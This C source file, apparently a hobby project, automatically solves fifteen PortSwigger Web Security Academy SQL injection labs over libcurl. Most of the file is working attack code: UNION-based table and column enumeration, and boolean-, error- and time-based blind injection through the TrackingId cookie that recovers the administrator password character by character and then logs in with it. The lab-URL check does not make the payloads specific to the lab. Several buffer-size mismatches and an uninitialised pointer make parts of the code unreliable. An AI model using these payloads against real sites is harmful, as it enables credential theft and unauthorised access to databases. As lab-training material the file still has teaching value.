#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <curl/curl.h>

// I made the PAAS C project to improve myself in C language.
// linkedin -> https://www.linkedin.com/in/emregl/
// github -> https://github.com/emre-mr246/paas/

typedef struct {
    const char *lab_name;
    int lab_id;
} LabMapping;


CURL *curl;
char url[200];
char html_response[100000];
char header_buffer[10000];
char csrf_token[100];

int extract_value_from_html_response(char* extracted_value, const char* value_start, const char* value_end, const int number_of_characters_to_skip) 
{
    const char *start_point = strstr(html_response, value_start);
    if (start_point) {
        start_point += number_of_characters_to_skip;
        const char *end_point = strstr(start_point, value_end);

        if (end_point) {
            strncpy(extracted_value, start_point, end_point - start_point);
            extracted_value[end_point - start_point] = '\0';
            return 0;
        }
    }
    return -1;
}


int find_lab_id() 
{ 
    // PAAS supports the SQLi labs listed below
    LabMapping lab_mappings[] = {
            {"SQL injection vulnerability in WHERE clause allowing retrieval of hidden data",       1},
            {"SQL injection vulnerability allowing login bypass",                                   2},
            {"SQL injection attack, querying the database type and version on Oracle",              3},
            {"SQL injection attack, querying the database type and version on MySQL and Microsoft", 4},
            {"SQL injection attack, listing the database contents on non-Oracle databases",         5},
            {"SQL injection attack, listing the database contents on Oracle",                       6},
            {"SQL injection UNION attack, determining the number of columns returned by the query", 7},
            {"SQL injection UNION attack, finding a column containing text",                        8},
            {"SQL injection UNION attack, retrieving data from other tables",                       9},
            {"SQL injection UNION attack, retrieving multiple values in a single column",           10},
            {"Blind SQL injection with conditional responses",                                      11},
            {"Blind SQL injection with conditional errors",                                         12},
            {"Visible error-based SQL injection",                                                   13},
            {"Blind SQL injection with time delays",                                                14},
            {"Blind SQL injection with time delays and information retrieval",                      15}
    };
    
    int lab_id = -1;
    char lab_name[90];

    // lab name is kept between title tags
    extract_value_from_html_response(lab_name, "<title>", "</title>", 7);
    
    for (size_t i = 0; i < sizeof(lab_mappings) / sizeof(lab_mappings[0]); i++) {
        if (strcmp(lab_name, lab_mappings[i].lab_name) == 0) {
            lab_id = lab_mappings[i].lab_id;
            return lab_id;
        }
    }

    return -1;
}


int performCurlRequest() 
{
    memset(html_response, 0, strlen(html_response) + 1);
    memset(header_buffer, 0, strlen(header_buffer) + 1);
    CURLcode res = curl_easy_perform(curl);
    if (res != CURLE_OK) {
        fprintf(stderr, "curl_easy_perform() failed: %s\n", curl_easy_strerror(res));
        return -1;
    }
    return 0;
}


size_t write_callback(const char *data, size_t size, size_t count) 
{
    size_t total_size = size * count;
    strncat(html_response, data, strlen(data) + 1);
    return total_size;
}


size_t write_header_callback(const char *data, size_t size, size_t count) 
{
    size_t total_size = size * count;
    strncat(header_buffer, data, strlen(data) + 1);
    return total_size;
}


void reset_curl_settings() 
{
    curl_easy_reset(curl);
    curl_easy_setopt(curl, CURLOPT_URL, url);
    curl_easy_setopt(curl, CURLOPT_PROXY, "http://127.0.0.1:8080");
    curl_easy_setopt(curl, CURLOPT_SSL_VERIFYPEER, 0L);
    curl_easy_setopt(curl, CURLOPT_SSL_VERIFYHOST, 0L);
    curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, write_callback);
    curl_easy_setopt(curl, CURLOPT_WRITEDATA, html_response);
    curl_easy_setopt(curl, CURLOPT_HEADERFUNCTION, write_header_callback);
    curl_easy_setopt(curl, CURLOPT_HEADERDATA, header_buffer);
}


void login_as_administrator(const char *admin_password, const char *login_url, char *post_data) 
{
    curl_easy_setopt(curl, CURLOPT_COOKIE, "");
    curl_easy_setopt(curl, CURLOPT_URL, login_url);
    performCurlRequest();
    extract_value_from_html_response(csrf_token, "value=\"", "\"", 7);

    snprintf(post_data, 150, "csrf=%s&username=administrator&password=%s", csrf_token, admin_password);
    curl_easy_setopt(curl, CURLOPT_POSTFIELDS, post_data);

    sleep(1);
    performCurlRequest();
}


int is_lab_url() 
{
    if (strstr(url, ".web-security-academy.net") == NULL)
        return -1;

    const char *http_prefix = "http://";
    const char *https_prefix = "https://";

    if (strncmp(url, http_prefix, 7) == 0 || strncmp(url, https_prefix, 8) == 0)
        return 0;

    return -1;
}   


int clear_url() 
{
    // Deletes everything after the third "/" sign with the third "/".
    int slashCount = 0;

    for (int i = 0; url[i] != '\0'; i++) {
        if (url[i] == '/') {
            slashCount++;
            if (slashCount == 3) {
                url[i] = '\0';
                break;
            }
        }
    }

    // If the url ends with newline, it deletes it.
    size_t length = strlen(url);
    if (length > 0 && strlen(url)-1 == '\n') {
        url[length - 1] = '\0';
    }

    return 0;
}


int determine_column_count(char* comment_sign) 
{
    int i = 1;
    int max_attempts = 15;
    while (i < max_attempts) {
        if (strstr(html_response, "Internal Server Error") != NULL) {
            i -= 2;
            break;
        }
        char temp_url[200];
        strncpy(temp_url, url, strlen(url) + 1);
        snprintf(url, 300,"%s/filter?category=Accessories'+order+by+%d%s", temp_url, i, comment_sign);
        curl_easy_setopt(curl, CURLOPT_URL, url);

        if (performCurlRequest() != 0)
            return -1;
        i++;
        clear_url(url);
    }
    return i;
}


int check_is_the_lab_solved()
{
    // If the lab has been solved, we make two requests to receive the response "Congratulations, you solved the lab!"
    reset_curl_settings();
    performCurlRequest();
    performCurlRequest();
    
    if(strstr(html_response, "Congratulations, you solved the lab!") == 0)
        return 0;
    else
        return -1;
}


int solve_the_lab(const int lab_to_be_solved) 
{
    int column_count = -1, loop_until_column_count = -1;
    char sqli_payload[260] = "", sqli_payload_mid[150] = "", sqli_payload_end[150] = "";
    char users_table_name[25] = "", usernames_column_name[25] = "", passwords_column_name[25] = "";
    char admin_password[30] = "", password_temp[30] = "";
    char tracking_id_cookie[100] = "";
    char post_data[250] = "";
    char alphabetAndNumbers[] = "0123456789abcdefghijklmnopqrstuvwxyz";
    char login_url[100] = "", url_temp[100] = "";
    snprintf(login_url, 300, "%s/login", url);
    strncpy(url_temp, url, strlen(url) + 1);

    if (lab_to_be_solved == 1) {
        // Lab name: "SQL injection vulnerability in WHERE clause allowing retrieval of hidden data"
        strncat(url, "/filter?category=Accessories'+or+1+=1--", 40);
        curl_easy_setopt(curl, CURLOPT_URL, url);

        performCurlRequest();
    }

    else if (lab_to_be_solved == 2) {
        // Lab name: "SQL injection vulnerability allowing login bypass"
        curl_easy_setopt(curl, CURLOPT_URL, login_url);
        performCurlRequest();
        extract_value_from_html_response(csrf_token, "value=\"", "\"", 7);

        snprintf(post_data, sizeof(post_data), "csrf=%s&username=administrator'--&password=password", csrf_token);
        curl_easy_setopt(curl, CURLOPT_POSTFIELDS, post_data);
        performCurlRequest();
    }

    else if (lab_to_be_solved == 3) {
        // Lab name: "SQL injection attack, querying the database type and version on Oracle"
        column_count = determine_column_count("--");

        strncpy(sqli_payload, "/filter?category=Accessories'+UNION+SELECT+'abc'", sizeof(sqli_payload));
        strncpy(sqli_payload_mid, ",'test'", sizeof(sqli_payload_mid));
        strncpy(sqli_payload_end, "+FROM+dual--", sizeof(sqli_payload_end));

        loop_until_column_count = 1;
        while(loop_until_column_count != column_count) {
            strncat(sqli_payload, sqli_payload_mid, strlen(sqli_payload_mid) + 1);
            loop_until_column_count++;
        }
        snprintf(url, 510, "%s%s%s", url_temp, sqli_payload, sqli_payload_end);

        curl_easy_setopt(curl, CURLOPT_URL, url);
        performCurlRequest();
        clear_url(url);

        // exploit
        strncpy(sqli_payload, "/filter?category=Accessories'+UNION+SELECT+BANNER", sizeof(sqli_payload));
        strncpy(sqli_payload_mid, ",+NULL", sizeof(sqli_payload_mid));
        strncpy(sqli_payload_end, "+FROM+v$version--", sizeof(sqli_payload_end));

        while(loop_until_column_count > 1) {
            strncat(sqli_payload, sqli_payload_mid, strlen(sqli_payload_mid) + 1);
            loop_until_column_count--;
        }
        snprintf(url, 510, "%s%s%s", url_temp, sqli_payload, sqli_payload_end);

        curl_easy_setopt(curl, CURLOPT_URL, url);
        performCurlRequest();
    }

    else if (lab_to_be_solved == 4) {
        // Lab name: "SQL injection attack, querying the database type and version on MySQL and Microsoft"
        column_count = determine_column_count("%23");

        strncpy(sqli_payload, "/filter?category=Accessories'+UNION+SELECT+'abc'", sizeof(sqli_payload));
        strncpy(sqli_payload_mid, ",'test'", sizeof(sqli_payload_mid));
        strncpy(sqli_payload_end, "%23", sizeof(sqli_payload_end));

        loop_until_column_count = 1;
        while (loop_until_column_count < column_count) {
            strncat(sqli_payload, sqli_payload_mid, strlen(sqli_payload_mid) + 1);
            loop_until_column_count++;
        }
        snprintf(url, 510, "%s%s%s", url_temp, sqli_payload, sqli_payload_end);

        curl_easy_setopt(curl, CURLOPT_URL, url);
        performCurlRequest();
        clear_url(url);

        // exploit
        strncpy(sqli_payload, "/filter?category=Accessories'+UNION+SELECT+@@version", sizeof(sqli_payload));
        strncpy(sqli_payload_mid, ",+NULL", sizeof(sqli_payload_mid));
        strncpy(sqli_payload_end, "%23", sizeof(sqli_payload_end));

        loop_until_column_count = 1;
        while (loop_until_column_count < column_count) {
            strncat(sqli_payload, sqli_payload_mid, strlen(sqli_payload_mid) + 1);
            loop_until_column_count++;
        }
        snprintf(url, 510, "%s%s%s", url_temp, sqli_payload, sqli_payload_end);

        curl_easy_setopt(curl, CURLOPT_URL, url);
        performCurlRequest();
    }

    else if (lab_to_be_solved == 5) {
        // Lab name: "SQL injection attack, listing the database contents on non-Oracle databases"
        column_count = determine_column_count("--");

        // retrieve the list of tables in the database
        strncpy(sqli_payload, "/filter?category=Accessories'+UNION+SELECT+table_name", sizeof(sqli_payload));
        strncpy(sqli_payload_mid, ",+NULL", sizeof(sqli_payload_mid));
        strncpy(sqli_payload_end, "+FROM+information_schema.tables--", sizeof(sqli_payload_end));


        loop_until_column_count = 1;
        while (loop_until_column_count < column_count) {
            strncat(sqli_payload, sqli_payload_mid, strlen(sqli_payload_mid) + 1);
            loop_until_column_count++;
        }
        snprintf(url, 510, "%s%s%s", url_temp, sqli_payload, sqli_payload_end);

        curl_easy_setopt(curl, CURLOPT_URL, url);
        performCurlRequest();
        clear_url(url);

        // find the name of the table containing user credentials
        extract_value_from_html_response(users_table_name, "users_", "<", 0);

        // retrieve the details of the columns in the user table
        strncpy(sqli_payload, "/filter?category=Accessories'+UNION+SELECT+column_name", sizeof(sqli_payload));
        strncpy(sqli_payload_mid, ",+NULL", sizeof(sqli_payload_mid));
        snprintf(sqli_payload_end, 150, "+FROM+information_schema.columns+WHERE+table_name='%s'--", users_table_name);

        loop_until_column_count = 1;
        while (loop_until_column_count < column_count) {
            strncat(sqli_payload, sqli_payload_mid, strlen(sqli_payload_mid) + 1);
            loop_until_column_count++;
        }
        snprintf(url, 510, "%s%s%s", url_temp, sqli_payload, sqli_payload_end);

        curl_easy_setopt(curl, CURLOPT_URL, url);
        performCurlRequest();
        clear_url(url);

        // finding the names of the columns containing usernames and passwords
        extract_value_from_html_response(usernames_column_name, "username_", "<", 0);
        extract_value_from_html_response(passwords_column_name, "password_", "<", 0);

        // retrieve the details of the columns in the users_table_name table
        snprintf(sqli_payload, 100, "/filter?category=Accessories'+UNION+SELECT+%s,+%s", usernames_column_name, passwords_column_name);
        strncpy(sqli_payload_mid, ",+NULL", sizeof(sqli_payload_mid));
        snprintf(sqli_payload_end, 40, "+FROM+%s--", users_table_name);

        loop_until_column_count = 2;
        while (loop_until_column_count < column_count) {
            strncat(sqli_payload, sqli_payload_mid, strlen(sqli_payload_mid) + 1);
            loop_until_column_count++;
        }
        snprintf(url, 510, "%s%s%s", url_temp, sqli_payload, sqli_payload_end);

        curl_easy_setopt(curl, CURLOPT_URL, url);
        performCurlRequest();
        clear_url(url);

        // extract administrator's password from column
        extract_value_from_html_response(admin_password, "administrator", "<", 51);

        // login as administrator and solve the lab
        login_as_administrator(admin_password, login_url, post_data);
        
    }

    else if (lab_to_be_solved == 6) {
        // Lab name: "SQL injection attack, listing the database contents on Oracle"
        column_count = determine_column_count("--");

        // retrieve the list of tables in the database
        strncpy(sqli_payload, "/filter?category=Accessories'+UNION+SELECT+table_name", 100);
        strncpy(sqli_payload_mid, ",+NULL", sizeof(sqli_payload_mid));
        strncpy(sqli_payload_end, "+FROM+all_tables--", 40);
        int f = 1;
        while (f < column_count) {
            strncat(sqli_payload, sqli_payload_mid, strlen(sqli_payload_mid) + 1);
            f++;
        }
        snprintf(url, 510, "%s%s%s", url_temp, sqli_payload, sqli_payload_end);

        curl_easy_setopt(curl, CURLOPT_URL, url);
        performCurlRequest();
        clear_url(url);

        // finding the names of the columns containing usernames and passwords
        extract_value_from_html_response(users_table_name, ">USERS_", "<", 1);

        // retrieve the details of the columns in the user table
        strncpy(sqli_payload, "/filter?category=Accessories'+UNION+SELECT+column_name", 100);
        strncpy(sqli_payload_mid, ",NULL", sizeof(sqli_payload_mid));
        snprintf(sqli_payload_end, 150, "+FROM+all_tab_columns+WHERE+table_name='%s'--", users_table_name);

        f = 1;
        while (f < column_count) {
            strncat(sqli_payload, sqli_payload_mid, strlen(sqli_payload_mid) + 1);
            f++;
        }
        snprintf(url, 510, "%s%s%s", url_temp, sqli_payload, sqli_payload_end);
        
        curl_easy_setopt(curl, CURLOPT_URL, url);

        performCurlRequest();
        clear_url(url);

        // finding the names of the columns containing usernames and passwords
        extract_value_from_html_response(usernames_column_name, "USERNAME_", "<", 0);
        extract_value_from_html_response(passwords_column_name, "PASSWORD_", "<", 0);

        // retrieve the details of the columns in the users_table_name table
        snprintf(sqli_payload, 100, "/filter?category=Accessories'+UNION+SELECT+%s,+%s", usernames_column_name, passwords_column_name);
        snprintf(sqli_payload_end, 40, "+FROM+%s--", users_table_name);
        while (f < column_count) {
            strncat(sqli_payload, sqli_payload_mid, strlen(sqli_payload_mid) + 1);
            f++;
        }
        snprintf(url, 550, "%s/filter?category=Accessories%s%s", url_temp, sqli_payload, sqli_payload_end);

        curl_easy_setopt(curl, CURLOPT_URL, url);
        performCurlRequest();
        clear_url(url);

        // extract administrator's password from column
        extract_value_from_html_response(admin_password, "administrator", "<", 51);

        // login as administrator and solve the lab
        login_as_administrator(admin_password, login_url, post_data);
    }

    else if (lab_to_be_solved == 7) {
        // Lab name: "SQL injection UNION attack, determining the number of columns returned by the query"
        strncpy(sqli_payload, "'+UNION+SELECT+NULL", 100);
        strncpy(sqli_payload_mid, ",NULL", sizeof(sqli_payload_mid));
        strncpy(sqli_payload_end, "--", sizeof(sqli_payload_mid));

        column_count = 1;
        while (column_count) {
            strncat(sqli_payload_mid, ",NULL", 6);
            snprintf(url, 700, "%s/filter?category=Accessories%s%s%s", url_temp, sqli_payload, sqli_payload_mid, sqli_payload_end);
            curl_easy_setopt(curl, CURLOPT_URL, url);

            performCurlRequest();
            if (strstr(html_response, "Internal Server Error") == NULL)
                break;

            column_count++;
            clear_url(url);
        }
    }

    else if (lab_to_be_solved == 8) {
        // Lab name: "SQL injection UNION attack, finding a column containing text"
        column_count = determine_column_count("--");

        // extracting the text provided by the lab
        char *db_string;
        extract_value_from_html_response(db_string, "Make the database retrieve the string: '", "\'", 40);

        // try replacing each null with the random value
        strncpy(sqli_payload, "/filter?category=Accessories'+UNION+SELECT+NULL", 100);
        strncpy(sqli_payload_mid, ",NULL", sizeof(sqli_payload_mid));
        strncpy(sqli_payload_end, "--", sizeof(sqli_payload_mid));
        char sqli_payload_mid_with_the_provided_string[300];
        snprintf(sqli_payload_mid_with_the_provided_string, 50, ",'%s'", db_string);

        int test_column = 1;
        loop_until_column_count = 1;
        while(loop_until_column_count < column_count) {
            loop_until_column_count = 1;
            while (loop_until_column_count < column_count) {
                if (test_column == loop_until_column_count) {
                    strncat(sqli_payload, sqli_payload_mid_with_the_provided_string, strlen(sqli_payload_mid_with_the_provided_string) + 1);
                } else {
                    strncat(sqli_payload, sqli_payload_mid, strlen(sqli_payload_mid) + 1);
                }
                loop_until_column_count++;
            }

            snprintf(url, 550, "%s/filter?category=Accessories%s%s", url_temp, sqli_payload, sqli_payload_end);
            curl_easy_setopt(curl, CURLOPT_URL, url);
            performCurlRequest();

            clear_url(url);
            loop_until_column_count++;
            test_column++;

            // for reset sqli_payload
            strncat(sqli_payload, "/filter?category=Accessories'+UNION+SELECT+NULL", 48);

        }
    }

    else if (lab_to_be_solved == 9) {
        // Lab name: "SQL injection UNION attack, retrieving data from other tables"
        strncat(url, "/filter?category=Accessories'+UNION+SELECT+'abc','def'--", 57);
        curl_easy_setopt(curl, CURLOPT_URL, url);
        performCurlRequest();

        clear_url(url);
        strncat(url, "/filter?category=Accessories'+UNION+SELECT+username,+password+FROM+users--", 75);
        curl_easy_setopt(curl, CURLOPT_URL, url);
        performCurlRequest();

        // extract administrator's password from column
        extract_value_from_html_response(admin_password, "administrator", "<", 51);

        // login as administrator and solve the lab
        login_as_administrator(admin_password, login_url, post_data);
    }

    else if (lab_to_be_solved == 10) {
        // Lab name: "SQL injection UNION attack, retrieving multiple values in a single column"
        strncat(url, "/filter?category=Accessories'+UNION+SELECT+NULL,'abc'--", 56);
        curl_easy_setopt(curl, CURLOPT_URL, url);
        performCurlRequest();

        clear_url(url);
        strncat(url, "/filter?category=Accessories'+UNION+SELECT+NULL,username||'~'||password+FROM+users--", 85);
        curl_easy_setopt(curl, CURLOPT_URL, url);
        performCurlRequest();

        // extract administrator's password from column
        extract_value_from_html_response(admin_password, "administrator", "<", 51);

        // login as administrator and solve the lab
        login_as_administrator(admin_password, login_url, post_data);
    }

    else if (lab_to_be_solved == 11) {
        // Lab name: "Blind SQL injection with conditional responses"
        // clearing the existing cookies for the "trackingId" cookie to be sent by the website
        FILE *cookie_file = fopen("cookiejar.txt", "w");
        if (cookie_file == NULL) {
            printf("[!] unable to open the \"cookiejar.txt\"! ");
            return -1;
        }
        fclose(cookie_file);

        performCurlRequest();
        extract_value_from_html_response(tracking_id_cookie, "TrackingId=", ";", 11);

        int until_administrator_password_length = 1;
        // left, right and mid value for binary search
        int left = 0, right = 35, mid = -1;

        while(until_administrator_password_length < 21) {
            left = 0, right = 35;
            while (left <= right) {
                mid = left + (right - left) / 2;
                int current_character_ascii_value = (int)alphabetAndNumbers[mid];
                snprintf(sqli_payload, 250, "TrackingId=%s' AND (SELECT ASCII(SUBSTRING(password,%d,1)) FROM users WHERE username='administrator')='%d", tracking_id_cookie, until_administrator_password_length, current_character_ascii_value);
                curl_easy_setopt(curl, CURLOPT_COOKIE, sqli_payload);
                performCurlRequest();

                if (strstr(html_response, "Welcome back!") != NULL) {
                    strncpy(password_temp, admin_password, strlen(admin_password) + 1);
                    snprintf(admin_password, 100, "%s%c", password_temp, alphabetAndNumbers[mid]);
                    break;
                }

                snprintf(sqli_payload, 250, "TrackingId=%s' AND (SELECT ASCII(SUBSTRING(password,%d,1)) FROM users WHERE username='administrator')<'%d", tracking_id_cookie, until_administrator_password_length, current_character_ascii_value);
                curl_easy_setopt(curl, CURLOPT_COOKIE, sqli_payload);
                performCurlRequest();

                if (strstr(html_response, "Welcome back!") == NULL)
                    left = mid + 1;
                else
                    right = mid - 1;
            }
            until_administrator_password_length++;
        }
        // login as administrator and solve the lab
        login_as_administrator(admin_password, login_url, post_data);
    }

    else if (lab_to_be_solved == 12) {
        // Lab name: "Blind SQL injection with conditional errors"
        performCurlRequest();
        extract_value_from_html_response(tracking_id_cookie, "TrackingId=", ";", 11);

        int until_administrator_password_length = 1;
        // left, right and mid value for binary search
        int left = 0, right = 35, mid = -1;

        while(until_administrator_password_length < 21) {
            left = 0, right = 35;
            while (left <= right) {
                mid = left + (right - left) / 2;
                int current_character_ascii_value = (int)alphabetAndNumbers[mid];

                snprintf(sqli_payload, 250,"TrackingId=%s'||(SELECT CASE WHEN ASCII(SUBSTR(password,%d,1))=%d THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'", tracking_id_cookie, until_administrator_password_length, current_character_ascii_value);
                curl_easy_setopt(curl, CURLOPT_COOKIE, sqli_payload);
                performCurlRequest();

                if (strstr(html_response, "Internal Server Error") != NULL) {
                    strncpy(password_temp, admin_password, strlen(admin_password) + 1);
                    snprintf(admin_password, 100, "%s%c", password_temp, alphabetAndNumbers[mid]);
                    break;
                }

                snprintf(sqli_payload, 250,"TrackingId=%s'||(SELECT CASE WHEN ASCII(SUBSTR(password,%d,1))<%d THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'", tracking_id_cookie, until_administrator_password_length, current_character_ascii_value);
                curl_easy_setopt(curl, CURLOPT_COOKIE, sqli_payload);
                performCurlRequest();

                if (strstr(html_response, "Internal Server Error") == NULL)
                    left = mid + 1;
                else
                    right = mid - 1;
            }
            until_administrator_password_length++;
        }
        // login as administrator and solve the lab
        login_as_administrator(admin_password, login_url, post_data);
    }

    else if (lab_to_be_solved == 13) {
        // Lab name: "Visible error-based SQL injection"
        curl_easy_setopt(curl, CURLOPT_COOKIE, "TrackingId=' AND 1=CAST((SELECT password FROM users LIMIT 1) AS int)--");
        performCurlRequest();

        extract_value_from_html_response(admin_password, "integer: ", "\"", 10);

        // login as administrator and solve the lab
        login_as_administrator(admin_password, login_url, post_data);
    }

    else if (lab_to_be_solved == 14) {
        // Lab name: "Blind SQL injection with time delays"
        curl_easy_setopt(curl, CURLOPT_COOKIE, "TrackingId=paas'||pg_sleep(10)--");
        performCurlRequest();
    }
    
    else if (lab_to_be_solved == 15) {
        // Lab name: "Blind SQL injection with time delays and information retrieval"
        performCurlRequest();
        extract_value_from_html_response(tracking_id_cookie, "TrackingId=", ";", 11);

        int until_administrator_password_length = 1;
        int current_character_ascii_value = -1;
        double curl_request_response_time = -1.00;

        while(until_administrator_password_length < 21) {
            int until_alphabet_and_numbers_array_character_count = 0;
            while (until_alphabet_and_numbers_array_character_count < 36) {
                curl_request_response_time = 0.00;
                current_character_ascii_value = (int)alphabetAndNumbers[until_alphabet_and_numbers_array_character_count];
                snprintf(sqli_payload, 250, "TrackingId=%s'%%3BSELECT+CASE+WHEN+(username='administrator'+AND+ASCII(SUBSTRING(password,%d,1))='%d')+THEN+pg_sleep(1)+ELSE+pg_sleep(0)+END+FROM+users--", tracking_id_cookie, until_administrator_password_length, current_character_ascii_value);
                curl_easy_setopt(curl, CURLOPT_COOKIE, sqli_payload);
                performCurlRequest();

                curl_easy_getinfo(curl, CURLINFO_TOTAL_TIME, &curl_request_response_time);
                if (curl_request_response_time > 0.95) {
                    strncpy(password_temp, admin_password, strlen(admin_password) + 1);
                    snprintf(admin_password, 100, "%s%c", password_temp, alphabetAndNumbers[until_alphabet_and_numbers_array_character_count]);
                    break;
                    }
                until_alphabet_and_numbers_array_character_count++;
                }
            until_administrator_password_length++;
        }
        login_as_administrator(admin_password, login_url, post_data);
    }
    else {
        printf("[!] Invalid input! (error code: 7)\n");
        return -1;
    }

    quit:
        if(check_is_the_lab_solved() == 0)
            return 0;
        else
            return -1;
}   


void show_paas_ascii_art() 
{
    system("clear");
    printf("\033[38;5;208m  _____  \033[0m                 \033[38;5;208m _____ \n");
    printf("\033[38;5;208m |  __ \\ \033[0m /\\       /\\    \033[38;5;208m/ ____|  \n");
    printf("\033[38;5;208m | |__) | \033[0m/\\\\      /\\\\  \033[38;5;208m | (___    \n");
    printf("\033[38;5;208m |  ___/\033[0m /  \\\\    /  \\\\ \033[38;5;208m \\\\___ \\\\ \n");
    printf("\033[38;5;208m | | \033[0m   /====\\\\  /====\\\\  \033[38;5;208m____)  \n");
    printf("\033[38;5;208m |_| \033[0m  /      \\\\/      \\\\ \033[38;5;208m|_____/ \n");
    printf("\n[P]\033[0mortswigger \033[38;5;208m[A]\033[0mcademy \033[38;5;208m[A]\033[0mutomatic \033[38;5;208m[S]\033[0molver \n");
    printf("by \033[38;5;208mmr246\033[0m \n\n");
}


int get_url_as_input() 
{
    // "Lab URL: " text with some colorization.
    printf("\033[38;5;208mLab URL\033[0m: ");

    if (fgets(url, 200, stdin) == NULL)
        return -1;

    return 0;
}


int initialize_curl()
{
    curl_global_init(CURL_GLOBAL_DEFAULT);  
    curl = curl_easy_init();

    if (!curl)
        return -1;

    reset_curl_settings();
    if (performCurlRequest() != 0) {
        printf("Please make sure to proxy listener is open!");
        return -1;
    }

    curl_easy_setopt(curl, CURLOPT_COOKIEJAR, "cookiejar.txt");
    return 0;
}


void clear_curl()
{
    curl_easy_cleanup(curl);
    curl_global_cleanup();
}


void exit_with_error_message(char *message) 
{
    printf("%s", message);
    exit(-1);
}


int main() 
{
    show_paas_ascii_art();
    
    if (get_url_as_input() != 0)
        exit_with_error_message("[-] invalid input! (error in get_url_as_input() function.)\n");

    if (is_lab_url(url) != 0)
        exit_with_error_message("[-] invalid URL! (error in is_lab_url() function.)\n");

    if (clear_url(url) != 0 )
        exit_with_error_message("[-] invalid URL! (error in clear_url() function.)\n");

    if (initialize_curl() != 0)
        exit_with_error_message("[-] curl initialization failed (error in initialize_curl() function.\n");
   
    if (solve_the_lab(find_lab_id(html_response)) == 0)
        printf("[+] Lab successfully solved!\n");
    else 
        exit_with_error_message("[-] lab solution failed. (something went wront in solve_the_lab())\n");

    clear_curl();

    return 0;
}